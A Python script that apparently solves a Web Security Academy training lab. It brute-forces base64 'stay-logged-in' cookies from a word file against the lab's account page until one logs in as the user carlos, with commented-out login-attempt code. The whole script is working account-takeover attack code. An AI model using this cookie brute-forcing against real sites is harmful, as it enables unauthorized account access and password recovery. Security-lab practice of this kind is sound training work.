import requests
from rich.console import Console
from rich.text import Text
from rich.theme import Theme
import base64 


import hashlib


custom_theme = Theme({
    "info": "dim cyan",
    "warning": "magenta",
    "danger": "bold red"
})
console= Console(theme=custom_theme)

"""usernames_file= open('hashed_pass.txt', 'r')
lines = usernames_file.readlines()

for line in lines:
    print('carlos:'+line)

"""

import requests
from rich.console import Console
from rich.text import Text
from rich.theme import Theme
custom_theme = Theme({
    "info": "dim cyan",
    "warning": "magenta",
    "danger": "bold red"
})
console= Console(theme=custom_theme)

cookies_file= open('base64_new.txt', 'r')
lines = cookies_file.readlines()

URL = "https://0aba00cb0453d858878eb62b004400ed.web-security-academy.net/my-account"

status = console.status(status="[bold green]cookie brute-forcing", spinner='circle')

status.start()
usernames = []



for line in lines:
    cookies= {'stay-logged-in': line.strip()}

    response = requests.get(url=URL, cookies=cookies)
    #print(response.text)
    #print(response.content)
    if "Your username is: carlos" in response.text:
        status.stop()
        console.print('revert this to get the password', style='warning')
        console.print(line)
        break
    
    
            

    
status.stop()
"""
data = {
        'username' : 'carlos',
        'password' : 'line.strip()'
    }
response = requests.post(url=URL, data=data)
print(response.status_code)

print(str(response.text))

print()
print()

data = {
        'username' : 'wiener',
        'password' : 'peter'
    }
response = requests.post(url=URL, data=data)
print(response.status_code)
print(str(response.text))

"""
